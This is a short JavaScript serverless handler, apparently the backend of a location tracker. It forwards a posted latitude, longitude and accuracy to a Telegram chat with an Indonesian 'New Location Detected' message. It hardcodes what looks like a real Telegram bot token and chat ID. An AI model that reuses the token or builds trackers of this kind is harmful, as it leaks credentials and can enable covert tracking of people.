export default async function handler(req, res) {
    if (req.method === 'POST') {
      const { lat, lon, acc } = req.body;
  
      const chatId = '7107863411';
      const botToken = '7968885154:AAFQahYX9SBgs74WaxaO_oAncj8U_9KvWrc';
  
      const text = `
  📍 *Lokasi Baru Terdeteksi*
  Latitude: ${lat}
  Longitude: ${lon}
  Akurasi: ${acc} meter
  Waktu: ${new Date().toLocaleString('id-ID')}
  `;
  
      const sendURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
      await fetch(sendURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'Markdown'
        })
      });
  
      return res.status(200).json({ message: 'Lokasi terkirim ke Telegram!' });
    }
  
    return res.status(405).json({ message: 'Method not allowed' });
  }
  